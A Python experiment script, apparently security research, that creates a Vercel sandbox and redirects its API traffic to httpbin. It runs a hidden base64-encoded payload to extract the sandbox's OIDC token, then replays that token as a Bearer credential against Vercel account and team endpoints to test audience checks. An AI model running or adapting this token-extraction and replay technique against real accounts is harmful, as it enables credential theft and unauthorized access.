# 实验G6驱动: 沙箱内获取 OIDC token -> 本地用 Bearer 调 API 验证 aud 校验
import json, base64, pathlib, urllib.request, urllib.error, re

TOKEN = "vcp_REDACTED_PLACEHOLDER"
TEAM = "team_GIy1SZ444lspqeNbh4r8uAUg"
PROJ = "prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F"

def api(method, path, body=None, headers=None, timeout=60):
    req = urllib.request.Request(f"https://api.vercel.com{path}", method=method)
    req.add_header("Authorization", f"Bearer {TOKEN}")
    req.add_header("Content-Type", "application/json")
    for k, v in (headers or {}).items():
        req.add_header(k, v)
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:800]
    except Exception as e:
        return -1, f"EXC {type(e).__name__}: {e}"

NAME = "expg6"
api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
c, r = api("POST", f"/v2/sandboxes?teamId={TEAM}",
           {"projectId": PROJ, "name": NAME,
            "networkPolicy": {"mode": "custom", "allowedDomains": ["httpbin.org", "api.vercel.com"]}})
print("create:", c)
sid = json.loads(r)["sandbox"]["currentSessionId"]
print("sid:", sid)

c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/network-policy?teamId={TEAM}",
           {"allow": {"api.vercel.com": [
               {"match": {"path": {"startsWith": "/v2"}},
                "forwardURL": "https://httpbin.org/anything"}]}})
print("update:", c, r[:120])

# 沙箱内拿 token
payload = base64.b64encode(pathlib.Path("exp_g6.py").read_bytes()).decode()
body = {"command": "python3", "args": ["-c", f"import base64;exec(base64.b64decode('{payload}').decode())"],
        "wait": True, "logs": True, "timeout": 60000}
c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
print("cmd:", c)
out = ""
for line in r.splitlines():
    line = line.strip()
    if not line:
        continue
    try:
        d = json.loads(line)
        if d.get("stream") in ("stdout", "stderr"):
            out += d.get("data", "")
        elif d.get("stream") == "command":
            print("EXIT:", d.get("command", {}).get("exitCode"))
    except Exception:
        print(line[:300])

m = re.search(r"TOKEN_START\n(.*?)\nTOKEN_END", out, re.S)
if m:
    tok = m.group(1).strip()
    print("TOKEN_LEN:", len(tok))
    print("TOKEN:", tok[:80], "...")
    open("_oidc_token.txt", "w").write(tok)

    # 本地用 Bearer 调 API(验证 aud 校验)
    print("\n== Bearer 测试(本地) ==")
    for path in ["/v2/user", f"/v2/teams/{TEAM}"]:
        c2, r2 = api("GET", path, headers={"Authorization": f"Bearer {tok}"})
        print(f"GET {path} -> {c2} {r2[:400]}")
    # 对照组: 正常 token
    c3, r3 = api("GET", "/v2/user")
    print(f"\n对照(正常 token) GET /v2/user -> {c3} {r3[:200]}")
else:
    print("NO TOKEN. out head:", out[:1200])

api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
print("\ncleanup done")
